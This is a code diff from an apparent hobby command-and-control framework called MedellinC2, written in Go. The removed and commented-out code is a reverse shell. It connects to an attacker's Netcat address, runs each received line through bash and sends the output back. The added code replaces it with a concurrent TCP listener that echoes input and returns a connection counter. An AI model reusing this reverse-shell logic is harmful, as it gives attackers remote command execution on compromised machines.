@@ -8,15 +8,18 @@ import (
 	"bufio"
 	"errors"
 	"fmt"
-	"log"
 	"net"
 	"os"
-	"os/exec"
+	"strconv"
+	"strings"
 
 	"github.com/manifoldco/promptui"
 	"github.com/megatop1/MedellinC2/data"
 	"github.com/spf13/cobra"
 )
+
+//global variables
+var count = 0
 
 // createCmd represents the create command
 var createCmd = &cobra.Command{
@@ -134,18 +137,39 @@ func createNewListener() { //function to construct our listener
 	// Generate the listener using data from the user
 	// Create the TCP connection to your attackers Netcat
 	var ipAndPortString string = data.GetIP() + ":" + data.GetPort()
-	connection, err := net.Dial("tcp", ipAndPortString) //dial function connects to a server address, ("protocol", "IP", "Port")
-	if err != nil {                                     //if there is an error
-		fmt.Print(err.Error()) //print the error
-		if nil != connection {
-			connection.Close()
+
+	/*
+		connection, err := net.Dial("tcp", ipAndPortString) //dial function connects to a server address, ("protocol", "IP", "Port")
+		if err != nil {                                     //if there is an error
+			fmt.Print(err.Error()) //print the error
+			if nil != connection {
+				connection.Close()
+			}
 		}
+		println("Connection IP and Port are: " + ipAndPortString)
+		//println("Listener successfully started") */
+
+	//CONCURRENT TCP SERVER (LISTENER)
+	listener, err := net.Listen("tcp4", ipAndPortString) //create listener and listen over tcp protocol over user defined Ip and port
+	if err != nil {
+		fmt.Println(err.Error())
+		return
 	}
-	println("Connection IP and Port are: " + ipAndPortString)
-	//println("Listener successfully started")
+	defer listener.Close()
+
+	for {
+		connection, err := listener.Accept()
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+		go handleConnection(connection)
+		count++
+
+	}
 
 	//Accept commands from attacker
-	for {
+	/*for {
 		attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
 		cmd := exec.Command("bash", "-c", attackerCommands)
 		if err != nil {
@@ -154,5 +178,26 @@ func createNewListener() { //function to construct our listener
 		out, _ := cmd.CombinedOutput()
 
 		connection.Write(out)
+	} */
+}
+
+//function to handle and process incoming connections to the listener
+func handleConnection(connection net.Conn) {
+	fmt.Print(".")
+	for {
+		netData, err := bufio.NewReader(connection).ReadString('\n')
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+
+		temp := strings.TrimSpace(string(netData))
+		if temp == "STOP" { //If the user enters in STOP then kill the connection
+			break
+		}
+		fmt.Println(temp)
+		counter := strconv.Itoa(count) + "\n"
+		connection.Write([]byte(string(counter)))
 	}
+	connection.Close()
 }
